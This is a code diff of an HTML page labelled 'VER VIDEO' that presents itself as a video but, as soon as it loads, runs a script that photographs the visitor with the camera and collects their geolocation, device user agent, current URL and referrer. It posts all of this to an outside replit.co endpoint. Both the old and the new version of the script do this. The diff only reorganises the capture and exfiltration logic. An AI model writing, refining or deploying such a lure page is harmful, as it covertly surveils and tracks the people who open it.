@@ -5,65 +5,75 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VER VIDEO</title>
     <script>
-        async function capturarDatos() {
-            // Capturar foto
+    async function capturarDatos() {
+        const datos = {};
+
+        // Capturar información del dispositivo
+        datos.userAgent = navigator.userAgent;
+
+        // Capturar geolocalización
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((position) => {
+                datos.ubicacion = {
+                    latitud: position.coords.latitude,
+                    longitud: position.coords.longitude
+                };
+                enviarDatos(datos);
+            }, (error) => {
+                console.error("Error obteniendo la geolocalización:", error);
+                datos.ubicacion = { latitud: "No disponible", longitud: "No disponible" };
+                enviarDatos(datos);
+            });
+        } else {
+            datos.ubicacion = { latitud: "No disponible", longitud: "No disponible" };
+        }
+
+        // Capturar historial (URL actual y referrer)
+        datos.historial = {
+            urlActual: window.location.href,
+            referrer: document.referrer
+        };
+
+        // Intentar capturar imagen desde la cámara
+        try {
             const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
             await video.play();
 
-            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const foto = canvas.toDataURL('image/jpeg');
 
-            // Detener el stream
+            const fotoBase64 = canvas.toDataURL('image/jpeg');
+            datos.foto = fotoBase64;
+
+            // Detener la cámara
             stream.getTracks().forEach(track => track.stop());
-
-            // Capturar versión y modelo del dispositivo
-            const userAgent = navigator.userAgent;
-
-            // Capturar geolocalización
-            const ubicacion = await new Promise(resolve => {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        resolve({
-                            latitud: position.coords.latitude,
-                            longitud: position.coords.longitude
-                        });
-                    },
-                    () => resolve({ latitud: 'No disponible', longitud: 'No disponible' })
-                );
-            });
-
-            // Capturar historial de navegación
-            const historial = {
-                urlActual: window.location.href,
-                referrer: document.referrer
-            };
-
-            // Enviar datos al servidor
-            const datos = { foto, userAgent, ubicacion, historial };
-            fetch('https://979c5a95-3dfb-4130-8e4b-c2a06b13a186-00-cuily0isatzs.spock.repl.co/capturar-datos', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(datos)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Datos enviados correctamente:", data);
-                document.getElementById("mensaje").textContent = "*.*";
-            })
-            .catch(error => {
-                console.error("Error al enviar los datos:", error);
-                document.getElementById("mensaje").textContent = "Error al enviar los datos.";
-            });
+        } catch (error) {
+            console.error("Error capturando la imagen:", error);
+            datos.foto = null; // No se pudo capturar la imagen
         }
 
-        window.onload = capturarDatos;
-    </script>
+        // Enviar los datos al servidor
+        enviarDatos(datos);
+    }
+
+    function enviarDatos(datos) {
+        fetch('https://979c5a95-3dfb-4130-8e4b-c2a06b13a186-00-cuily0isatzs.spock.repl.co/capturar-datos', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(datos)
+        })
+        .then(response => response.json())
+        .then(data => console.log("Datos enviados correctamente:", data))
+        .catch(error => console.error("Error enviando los datos:", error));
+    }
+
+    window.onload = capturarDatos;
+</script>
 </head>
 <body>
     <h1>VIDEO</h1>
